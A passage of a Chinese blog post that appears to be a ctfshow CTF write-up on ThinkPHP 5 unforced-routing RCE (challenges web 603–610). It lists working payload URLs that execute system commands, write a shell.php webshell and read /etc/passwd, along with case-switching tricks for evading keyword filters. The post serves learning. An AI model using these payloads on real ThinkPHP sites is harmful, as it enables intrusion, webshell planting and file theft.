</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><img src="/medias/show-think/40.png" alt="40"></p> <p>好了，那么一切都迎刃而解了。这个路由和方法太过于危险，如果普通用户也可以访问利用来执行命令非常可怕，事实上默认配置也是允许用户访问的，所以题目描述<code>未开启强制路由RCE</code>。</p> <p>那么，理论上只要可以访问这个方法就可以实现rce，把常用的路由模式都是一遍（x），<a href="https://www.kancloud.cn/manual/thinkphp5/118012" target="_blank" rel="noopener noreferrer">新的url模式<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，并且tp5默认url不区分大小写了</p> <ul><li>http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</li> <li>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</li></ul> <p>这里第一种方式似乎解析不了，用第二种<code>?s</code>来解析</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>assert<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>tp5的一些常用payload：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>?s=index/think\Request/input&amp;filter=system&amp;data=dir
?s=index/think\Request/input&amp;filter[]=system&amp;data=pwd
?s=index/think\view\driver\Php/display&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
?s=index/think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
?s=index/think\Container/invokefunction&amp;function=call_user_func&amp;vars[]=system&amp;vars[]=dir
?s=index/think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">提示</p> <p>提一下，tp5 url模式不再区分大小写了，所以如果出现过滤关键词的情况，可以尝试大小写绕过，只管去做！</p></div> <h2 id="web-604"><a href="#web-604" class="header-anchor">#</a> web 604</h2> <blockquote><p>描述：未开启强制路由，举一反二</p></blockquote> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>题目里给出了tp5的版本号：版本thinkphp 5.1.29，其实不给也是可以的，通过报错使tp框架报错，通过返回的版本号直接谷歌对于漏洞打，太爽了</p></div> <p>用上一题的payload打，提示<code>invokefunction 这条路子不通，想想其他路子~</code>，使用上题提供的其他payload，也可以把<code>invokefunction</code>里替换为大写，通过url不区分大小写绕过</p> <p>太好玩啦！你还有多少惊喜是我不知道的？？？</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>INVokefuNcTion<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>assert<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>inVOkEFUNction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>assert<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\Request<span class="token operator">/</span>input<span class="token operator">&amp;</span>filter<span class="token operator">=</span>assert<span class="token operator">&amp;</span>data<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\Request<span class="token operator">/</span>input<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>assert<span class="token operator">&amp;</span>data<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>我的失败尝试：</p> <p>在<code>invokefucntion</code>方法下面接着看，还有<code>invokeMethod</code>,<code>invokeClass</code></p> <p><code>invokeMethod</code>方法的定义如下，接收两个参数，第一个是类的方法，第二个是数组参数</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">invokeMethod</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$class</span>   <span class="token operator">=</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$method</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">invokeClass</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$reflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// 静态方法</span>
        <span class="token variable">$reflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">bindParams</span><span class="token punctuation">(</span><span class="token variable">$reflect</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$debug</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">Log</span><span class="token operator">::</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ RUN ] '</span> <span class="token operator">.</span> <span class="token variable">$reflect</span><span class="token operator">-&gt;</span><span class="token keyword">class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'-&gt;'</span> <span class="token operator">.</span> <span class="token variable">$reflect</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'[ '</span> <span class="token operator">.</span> <span class="token variable">$reflect</span><span class="token operator">-&gt;</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' ]'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token variable">$reflect</span><span class="token operator">-&gt;</span><span class="token function">invokeArgs</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$class</span> <span class="token punctuation">:</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>尝试了两个原生类都不行，是用法错了吗？提示方法不存在，道友们有兴趣试试</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokeMethod<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token class-name static-context">SplFileObject</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=/flag</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokeMethod<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token class-name static-context">Error</span><span class="token operator">::</span><span class="token constant">getmessage</span><span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>ls
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="web-605"><a href="#web-605" class="header-anchor">#</a> web 605</h2> <blockquote><p>描述：未开启强制路由RCE-姿势2 版本thinkphp 5.1.29 举一反二</p></blockquote> <p>过滤了<code>invokefunction</code>、<code>input</code>，可以尝试url不区分大小写绕过。也可以试试试写文件，这里是可以的，为什么前面几题没用？试了，要么执行不了，要么没有写的权限</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>?s=index/\think\app/INVokefuNcTion&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
?s=index/\think\app/inVOkEFUNction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
?s=index/think\Request/iNput&amp;filter=assert&amp;data=phpinfo();
?s=index/think\Request/INPUt&amp;filter[]=assert&amp;data=phpinfo();
?s=index/think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="web-606"><a href="#web-606" class="header-anchor">#</a> web 606</h2> <blockquote><p>描述：未开启强制路由RCE-姿势4 版本thinkphp 5.1.29 举一反四</p></blockquote> <p>每次禁用上一题使用的payload的关键字时，通过大小写绕过一下即可。这题在上面的基础过滤了write，大写即可</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>?s=index/\think\app/INVokefuNcTion&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
?s=index/\think\app/inVOkEFUNction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
?s=index/think\Request/iNput&amp;filter=assert&amp;data=phpinfo();
?s=index/think\Request/INPUt&amp;filter[]=assert&amp;data=phpinfo();
?s=index/THINK\template\driver\file/WRITE&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="web-607"><a href="#web-607" class="header-anchor">#</a> web 607</h2> <blockquote><p>描述：未开启强制路由RCE-姿势5 举一反五</p></blockquote> <p>上的payload还是可以打，似乎都仅仅是过滤了小写</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>?s=index/\think\app/INVokefuNcTion&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
?s=index/\think\app/inVOkEFUNction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
?s=index/think\Request/iNput&amp;filter=assert&amp;data=phpinfo();
?s=index/think\Request/INPUt&amp;filter[]=assert&amp;data=phpinfo();
?s=index/THINK\template\driver\file/WRITE&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>学到一条新链子</p> <p>利用了一个<code>__call()</code>方法再触发display方法，可以渲染php代码</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>?s=index/\think\view\driver\Think/__call&amp;method=display&amp;params[]=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>没什么意思，学一下其他可以解析的链子，并不是所有版本都适用！</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Lang<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd   <span class="token comment"># 读取文件，如果知道flag文件名，....</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Config<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd <span class="token comment"># 包含任意文件，适用v5.0.*</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>一直到610，都是这个思路，只是过滤了不同的关键字，大小写绕过</p> <p>后续似乎都是反序列化挖链子的，打算单开一篇学习，那就到此结束了拜拜拜拜</p> <p>参考、致谢：</p> <ul><li><a href="https://github.com/top-think/thinkphp" target="_blank" rel="noopener noreferrer">Thinkphp v3.2.3官方源码<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://www.cnblogs.com/Cl0ud/p/15941252.html" target="_blank" rel="noopener noreferrer">thinkphp日志泄露<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://y4er.com/posts/thinkphp3-vuln/" target="_blank" rel="noopener noreferrer">tp3漏洞总结<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://blog.csdn.net/qq_50589021/article/details/120616736" target="_blank" rel="noopener noreferrer">tp3 SQL注入漏洞跟踪<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://blog.csdn.net/qq_50589021/article/details/120616736" target="_blank" rel="noopener noreferrer">thinkPHP3.2.3sql注入漏洞<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://blog.csdn.net/miuzzx/article/details/119410335" target="_blank" rel="noopener noreferrer">变量覆盖RCE<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://fallingskies22.github.io/post/ctfshowthinkphp-zhuan-ti/" target="_blank" rel="noopener noreferrer">变量覆盖RCE<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://www.modb.pro/db/501435" target="_blank" rel="noopener noreferrer">未开启强制路由RCE<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://blog.csdn.net/weixin_45669205/article/details/116724655" target="_blank" rel="noopener noreferrer">未开启强制路由RCE<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/Apursuit/Apursuit.github.io/edit/master/docs/01.wp/15.ctfshow-thinkphp专题.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">最后一次更新于:</span> <span class="time">2025/10/08, 22:34:57</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/e5ee7e/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">ctfshow单身杯</div></a> <a href="/pages/a0b4dd/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">玄机-webshell查杀</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/e5ee7e/" class="prev">ctfshow单身杯</a></span> <span class="next"><a href="/pages/a0b4dd/">玄机-webshell查杀</a>→
      </span></p></div></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:admin@gmail.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Apursuit" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2024-2026
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.dd92e586.js" defer></script><script src="/assets/js/2.1b31a38c.js" defer></script><script src="/assets/js/19.c48fa7c0.js" defer></script>
  </body>
</html>
